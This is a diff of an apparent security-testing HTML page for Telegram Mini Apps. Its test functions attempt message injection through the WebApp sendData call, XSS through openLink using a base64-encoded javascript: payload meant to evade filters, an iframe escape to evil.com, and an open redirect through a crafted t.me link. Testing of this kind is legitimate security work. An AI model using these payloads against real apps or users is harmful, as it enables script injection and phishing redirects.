@@ -4,14 +4,15 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Telegram Mini App Security Test</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script> <!-- Ensure WebApp API is loaded -->
 </head>
 <body>
     <h1>Telegram Mini App Security Test</h1>
-    <button onclick="exploitWebApp()">📩 Test Message Injection via WebApp Override</button>
-    <button onclick="testOpenLink()">🖥️ Test XSS via openLink()</button>
+    <button onclick="testMessageInjection()">📩 Test Message Injection via WebApp API</button>
+    <button onclick="testXSS()">🖥️ Test XSS via openLink()</button>
     <button onclick="testCSRF()">⚠️ Test CSRF Attack</button>
-    <button onclick="checkIframeBreakout()">🔓 Test Iframe Escape</button>
-    <button onclick="testOpenRedirect()">🔗 Test Open Redirect with Shortened URL</button>
+    <button onclick="checkIframeEscape()">🔓 Test Iframe Escape</button>
+    <button onclick="testOpenRedirect()">🔗 Test Open Redirect</button>
 
     <script>
         // 🚨 1. Listen for incoming messages from Telegram
@@ -19,8 +20,8 @@
             console.log("📩 Received Message:", event.origin, event.data);
 
             // 🛑 Origin Spoofing Detection
-            if (event.origin !== "https://web.telegram.org") {
-                alert("⚠️ Possible origin bypass detected! Unexpected origin: " + event.origin);
+            if (!event.origin.includes("telegram.org") && !event.origin.includes("t.me")) {
+                alert("⚠️ Potential origin bypass detected! Unexpected origin: " + event.origin);
             }
 
             // 🚨 Check for Sensitive Data Exposure
@@ -29,28 +30,27 @@
             }
         });
 
-        // 🚀 2. Exploit WebApp Properties to Inject a Message
-        function exploitWebApp() {
-            console.log("📩 Attempting WebApp API override...");
+        // 🚀 2. Test Message Injection via WebApp API
+        function testMessageInjection() {
+            console.log("📩 Testing WebApp message injection...");
             if (window.Telegram && window.Telegram.WebApp) {
                 try {
-                    window.Telegram.WebApp.sendData = function() {
-                        return '{"event":"message","payload":{"chat_id":123456789,"text":"Injected Message via WebApp!"}}';
-                    };
-                    window.Telegram.WebApp.MainButton.setText("Exploit Triggered!").show();
-                    alert("✅ WebApp Exploit Executed! Check chat for injected message.");
+                    window.Telegram.WebApp.sendData('{"event":"message","payload":{"chat_id":123456789,"text":"Injected Message!"}}');
+                    alert("✅ Message Injection Test Executed. Check chat logs.");
                 } catch (e) {
-                    console.error("❌ Exploit failed:", e);
+                    console.error("❌ Injection failed:", e);
                 }
             } else {
-                alert("⚠️ Telegram WebApp API not found.");
+                alert("⚠️ Telegram WebApp API not available.");
             }
         }
 
         // ⚡ 3. Test XSS via openLink()
-        function testOpenLink() {
+        function testXSS() {
             if (window.Telegram && window.Telegram.WebApp) {
-                window.Telegram.WebApp.openLink("javascript:alert('XSS Detected!')");
+                // Encoded `javascript:` payload to bypass simple filters
+                const xssPayload = "javascript:eval(atob('YWxlcnQoJ1hTUyBEZXRlY3RlZCEnKQ=='))"; 
+                window.Telegram.WebApp.openLink(xssPayload);
             } else {
                 alert("⚠️ Telegram WebApp API not found.");
             }
@@ -76,7 +76,7 @@
         }
 
         // 🔓 5. Attempt Iframe Escape
-        function checkIframeBreakout() {
+        function checkIframeEscape() {
             try {
                 top.location = "https://evil.com";  // Should be blocked
                 alert("⚠️ Iframe escape possible!");
@@ -85,10 +85,10 @@
             }
         }
 
-        // 🔗 6. Test Open Redirect with Shortened URL
+        // 🔗 6. Test Open Redirect
         function testOpenRedirect() {
-            const redirectUrl = "https://shorturl.at/B3Wwf";  // Shortened link
-            window.location.href = redirectUrl;  // This will trigger the redirect
+            const redirectUrl = "https://t.me/yourbot?start=redirect&url=https%3A%2F%2Fevil.com";  // Crafted redirect
+            window.location.href = redirectUrl;  // This should trigger a redirect if vulnerable
         }
     </script>
 </body>
